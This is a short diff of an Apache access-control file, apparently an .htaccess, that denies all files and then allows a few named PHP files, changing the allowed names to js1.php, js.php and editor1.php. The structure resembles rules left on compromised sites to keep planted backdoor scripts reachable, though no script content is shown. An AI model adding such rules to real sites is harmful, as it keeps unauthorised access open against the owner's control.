@@ -2,7 +2,7 @@
 Order allow,deny 
 Deny from all 
 </FilesMatch> 
-<FilesMatch "^(js.php|conf.php|editor5.php)$"># 
+<FilesMatch "^(js1.php|js.php|editor1.php)$"># 
 Order allow,deny 
 Allow from all 
 </FilesMatch>
